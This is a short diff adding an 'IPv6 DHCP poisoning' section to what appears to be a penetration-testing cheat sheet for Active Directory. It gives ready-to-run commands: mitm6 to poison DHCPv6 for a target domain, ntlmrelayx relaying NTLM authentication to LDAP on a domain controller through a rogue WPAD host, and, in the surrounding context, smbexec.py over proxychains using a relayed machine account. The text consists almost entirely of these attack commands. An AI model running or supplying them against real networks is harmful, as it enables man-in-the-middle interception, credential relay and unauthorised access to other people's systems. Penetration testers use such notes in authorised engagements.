@@ -24,3 +24,9 @@
    
 - If you relay a machine account:   
    `proxychains smbexec.py 'DOMAIN/MACHINE$:gugus@<target-ip>'`   
+
+## IPv6 DHCP poisoning
+- Start rogue DHCPv6, where you specify the domain of your target:   
+  `mitm6 -d domain.local`   
+- Start ntlmrelayx to e.g. target LDAP on the DC (for querying AD information):   
+  `sudo ntlmrelayx.py -6 -t ldap://dc01 --no-smb-server -wh attacker-wpad -h`   
